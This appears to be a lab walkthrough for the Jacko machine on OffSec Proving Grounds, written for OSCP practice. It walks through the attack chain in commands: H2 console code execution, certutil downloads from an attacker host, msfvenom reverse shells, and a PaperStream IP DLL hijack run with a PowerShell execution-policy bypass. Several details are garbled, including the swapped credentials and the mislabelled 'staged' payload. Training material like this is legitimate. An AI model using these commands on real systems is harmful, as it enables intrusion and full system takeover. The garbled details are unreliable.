This walkthrough provides comprehensive notes and commands from the Jacko box walkthrough, a popular machine on OffSec's Proving Grounds (PG-Practice), designed for OSCP preparation.

This video covers a full penetration test, from initial enumeration to system-level privilege escalation.

## 📝 Comprehensive Notes & Walkthrough

The walkthrough for Jacko, a **Windows machine**, follows a classic penetration testing methodology:

| Phase | Summary | Key Vulnerability |
| :--- | :--- | :--- |
| **Initial Foothold** | Full port scan identifies the H2 Database console. Exploitation is achieved by using the database's default/blank credentials for unauthenticated root-level access. | **H2 Database Default Credentials** (CVE-2022-23225) [[41:31](http://www.youtube.com/watch?v=tQbUezvHa38&t=2491)] |
| **User Shell** | The database's arbitrary code execution feature is used to download and run a reverse shell. The initial non-staged shell is unstable, requiring a second, **staged payload** for a stable low-privilege shell. | **Staged vs. Non-Staged Payloads** [[01:11:01](http://www.youtube.com/watch?v=tQbUezvHa38&t=4261)] |
| **Privilege Escalation** | Enumeration reveals the `PaperStream IP` service running as **NT Authority\\System**. This service is vulnerable to a DLL Hijack, which is executed via a PowerShell script using an **Execution Policy Bypass** to gain a system shell. | **PaperStream IP DLL Hijack** (CVE-2016-5743) [[01:02:28](http://www.youtube.com/watch?v=tQbUezvHa38&t=3748)] |

-----

## 💻 Commands and Techniques

### 1\. Initial Enumeration

| Goal | Command | Details | Timestamp |
| :--- | :--- | :--- | :--- |
| **Full TCP Nmap Scan** | `nmap -p- -sV -sC $TARGET_IP --open` | Scans all 65535 ports, includes service version (`-sV`) and default scripts (`-sC`), and only reports open ports (`--open`). | [[30:54](http://www.youtube.com/watch?v=tQbUezvHa38&t=1854)] |
| **SMB Null Session Check** | `enum4linux -a $TARGET_IP` | Attempt to check for weak Server Message Block (SMB) security, including null sessions (anonymous login). (Result: **Unsuccessful** - No Null Session) | [[39:13](http://www.youtube.com/watch?v=tQbUezvHa38&t=2353)] |

### 2\. Gaining a Foothold (Root-Level Access via H2)

1.  **Exploit Default Credentials:** Access the H2 Database HTTP Console on **Port 8082**. Use the credentials: **User: `blank`** | **Password: `sa`** (with a blank password). This grants root-level access to the database [[42:16](http://www.youtube.com/watch?v=tQbUezvHa38&t=2536)].

2.  **Prepare for File Transfer:** Start an Apache web server on your attacker machine to host payloads.

      * `sudo service apache2 start`
      * `cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/`

3.  **H2 Arbitrary Code Execution (File Transfer):**
    Use the database's execution function to run `certutil.exe` on the target machine, which downloads a payload from your attacker machine.

    | Phase | Command |
    | :--- | :--- |
    | **Load Execution Alias** | `CREATE ALIAS IF NOT EXISTS SYSTEM_LOAD AS 'String systemLoad(String s) throws Exception { java.lang.System.load(s); return "done"; }'; CALL SYSTEM_LOAD('C:\Windows\Temp\jniscriptengine.dll');` |
    | **Download Payload (Non-Staged)** | `CALL JAVASCRIPT EVAL('certutil -URLCache -split -f http://[ATTACKER_IP]:80/netcat.exe C:\Windows\Temp\netcat.exe')` |

### 3\. Establishing a Stable Shell

The initial `netcat` shell is unstable because it's a **non-staged payload**. To get a stable shell, a **staged payload** must be used.

| Goal | Command | Details | Timestamp |
| :--- | :--- | :--- | :--- |
| **Generate Staged Payload** | `msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=8082 -f exe -o shell.exe` | Creates a stable, staged reverse shell executable (`.exe`). | [[01:12:45](http://www.youtube.com/watch?v=tQbUezvHa38&t=4365)] |
| **Transfer Staged Payload** | `CALL JAVASCRIPT EVAL('certutil -URLCache -split -f http://[ATTACKER_IP]:80/shell.exe C:\Windows\Temp\shell.exe')` | Transfers the new stable shell to the target machine. | [[01:14:15](http://www.youtube.com/watch?v=tQbUezvHa38&t=4455)] |
| **Execute Staged Payload** | `CALL JAVASCRIPT EVAL('C:\Windows\Temp\shell.exe')` | Executes the staged payload after setting up a netcat listener on **Port 8082** on the attacker machine (`nc -lvnp 8082`). | [[01:15:06](http://www.youtube.com/watch?v=tQbUezvHa38&t=4506)] |

-----

### 4\. Privilege Escalation (to NT Authority\\System)

1.  **Identify Vulnerable Service:** The stable shell is used to find services running as `NT Authority\System`. The `PaperStream IP` service (version **1.42**) is identified as a potential vulnerability vector [[57:53](http://www.youtube.com/watch?v=tQbUezvHa38&t=3473)].
2.  **Generate Malicious DLL and Exploit Script:** A DLL payload is generated to take advantage of the DLL Hijacking vulnerability in PaperStream IP.
      * **DLL Payload Command:**
        ```bash
        msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=8082 -f dll -o uni_oldis.dll
        ```
      * The exploit requires a **PowerShell script** (`exploit.ps1`) to stop and restart the service, forcing it to load the malicious DLL.
3.  **Transfer Payloads:** Transfer both the generated DLL and the exploit script to the target machine using `certutil` (as in **Step 3**).
4.  **Execute Privilege Escalation:** The crucial step is running the PowerShell script with the **Execution Policy Bypass** flag, as Windows security policies prevent running arbitrary scripts by default.

| Execution Policy Bypass Command | Resulting Privilege | Timestamp |
| :--- | :--- | :--- |
| `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -EP bypass C:\Windows\Temp\exploit.ps1` | **NT Authority\\System** | [[01:18:13](http://www.youtube.com/watch?v=tQbUezvHa38&t=4693)] |

**Key Takeaway:** Always use the **`-EP bypass`** flag when executing an unauthorized PowerShell script for privilege escalation on Windows targets [[01:18:28](http://www.youtube.com/watch?v=tQbUezvHa38&t=4708)].

http://googleusercontent.com/youtube_content/0